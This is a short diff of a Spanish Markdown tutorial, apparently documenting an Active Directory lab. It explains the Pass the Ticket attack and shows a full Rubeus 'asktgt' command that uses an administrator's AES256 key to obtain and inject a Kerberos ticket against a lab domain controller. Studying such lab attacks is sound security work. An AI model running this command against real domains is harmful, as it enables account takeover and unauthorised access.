@@ -7,6 +7,7 @@ servicios en la red. En el caso de DCsync, si un atacante tiene acceso a tickets
 tickets para obtener acceso a otros servicios sin necesidad de credenciales adicionales.
 
 Mediante Rubeus podemos realizar el ataque Pass the Ticket utilizando el siguiente comando:
+
 .\Rubeus.exe asktgt /user:Administrador/aes256:adbc3ed526ed66b5633a9eec27b4cccbc4d6a1903aedfd6923437af3da26a87b/domain:cs.org /dc:172.16.1.51 /ptt
 
 ![alt text](https://github.com/Karovil/Active-Directory/blob/Andr%C3%A9s-Arbel%C3%A1ez/ptt1.png)
